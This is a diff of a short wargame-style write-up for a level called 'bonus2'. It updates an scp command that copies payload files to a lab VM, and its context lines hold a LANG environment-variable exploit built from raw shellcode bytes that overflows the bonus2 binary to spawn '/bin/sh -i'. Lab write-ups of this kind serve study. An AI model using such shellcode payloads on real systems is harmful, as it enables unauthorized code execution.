@@ -8,7 +8,7 @@ one in the LANG (see source, only the first 2 bytes are used) after the language
 the second is the second arg of bonus2 (the first arg is only of size 40 to get our second arg to be used)
 (see source, tests, env.c, script.c, payload_asm.asm)
 
-scp -P 4242 payload_b2 payload_fi payload_nl bonus2@192.168.56.102:/tmp
+scp -P 4242 Ressources/payload_b2 Ressources/payload_fi Ressources/payload_nl bonus2@192.168.56.105:/tmp
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 
 export LANG=$(python -c "print 'fi\x68\x37\xff\xff\xbf\xb8\x5f\xb0\xe6\xb7\x40\xff\xd0\x31\xc0\x40\x31\xdb\xcd\x80/bin/sh -i'")
